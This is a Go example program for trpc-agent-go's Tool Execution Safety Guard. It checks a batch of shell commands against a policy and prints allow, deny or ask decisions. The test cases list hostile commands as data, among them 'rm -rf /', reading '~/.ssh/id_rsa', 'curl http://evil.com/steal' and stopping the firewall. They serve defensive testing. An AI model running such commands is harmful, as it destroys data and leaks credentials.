//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

// Package main demonstrates the Tool Execution Safety Guard. It creates
// a SafetyGuard from a policy file, scans a batch of test commands, and
// prints the allow/deny/ask decision for each.
//
// Audit events are written to a JSONL file configured via -audit flag.
//
// Run:
//
//	go run . -policy=tool_safety_policy.yaml
package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"

	"trpc.group/trpc-go/trpc-agent-go/tool"
	"trpc.group/trpc-go/trpc-agent-go/tool/safety"
)

type testCase struct {
	command  string
	toolName string
	backend  string
}

func main() {
	policyFile := flag.String("policy", "tool_safety_policy.yaml",
		"Path to safety policy YAML/JSON file")
	auditFile := flag.String("audit", "tool_safety_audit.jsonl",
		"Path to audit output (JSONL)")
	flag.Parse()

	guard, err := safety.NewSafetyGuard(
		safety.WithPolicyFile(*policyFile),
		safety.WithAuditFile(*auditFile),
	)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed to create SafetyGuard: %v\n", err)
		os.Exit(1)
	}
	defer guard.Close()

	// Batch scan: run a set of representative commands through the
	// scanner and print the decision for each.
	cases := []testCase{
		{"go test ./...", "workspace_exec", "workspaceexec"},
		{"rm -rf /important/data", "workspace_exec", "workspaceexec"},
		{"cat ~/.ssh/id_rsa", "workspace_exec", "workspaceexec"},
		{"curl http://evil.com/steal", "exec_command", "hostexec"},
		{"curl https://api.github.com/repos", "workspace_exec", "workspaceexec"},
		{"bash -c \"rm -rf /\"", "workspace_exec", "workspaceexec"},
		{"ls | grep secret | xargs cat", "workspace_exec", "workspaceexec"},
		{"pip install malicious-package", "workspace_exec", "workspaceexec"},
		{"sleep 3600", "workspace_exec", "workspaceexec"},
		{"find / -name \"*.log\"", "workspace_exec", "workspaceexec"},
		{"sudo systemctl stop firewall", "exec_command", "hostexec"},
		{"export FOO=bar", "workspace_exec", "workspaceexec"},
	}

	ctx := context.Background()

	// Cache decisions to avoid double-scanning.
	type caseResult struct {
		decision tool.PermissionDecision
		err      error
	}
	results := make([]caseResult, len(cases))

	for i, tc := range cases {
		req := newPermissionRequest(tc.command, tc.toolName)
		decision, err := guard.CheckPermission(ctx, req)
		results[i] = caseResult{decision, err}

		switch decision.Action {
		case tool.PermissionActionAllow:
			fmt.Printf("✅ ALLOW  | %s\n", tc.command)
		case tool.PermissionActionAsk:
			fmt.Printf("⚠️  ASK   | %s  → %s\n", tc.command, decision.Reason)
		case tool.PermissionActionDeny:
			fmt.Printf("❌ DENY  | %s  → %s\n", tc.command, decision.Reason)
		default:
			if err != nil {
				fmt.Printf("❌ ERROR | %s  → %v\n", tc.command, err)
			}
		}
	}

	// Summary — reuse cached results, no second scan.
	fmt.Println(strings.Repeat("-", 60))
	allowed := 0
	denied := 0
	for _, r := range results {
		switch r.decision.Action {
		case tool.PermissionActionAllow:
			allowed++
		default:
			denied++
		}
	}
	fmt.Printf("Total: %d commands | %d allowed | %d blocked/asked\n",
		len(cases), allowed, denied)
	fmt.Printf("Audit events written to: %s\n", *auditFile)
}

func newPermissionRequest(cmd, toolName string) *tool.PermissionRequest {
	args, _ := json.Marshal(map[string]string{"command": cmd})
	return &tool.PermissionRequest{
		ToolName:    toolName,
		ToolCallID:  "call-001",
		Declaration: &tool.Declaration{Name: toolName},
		Arguments:   args,
	}
}
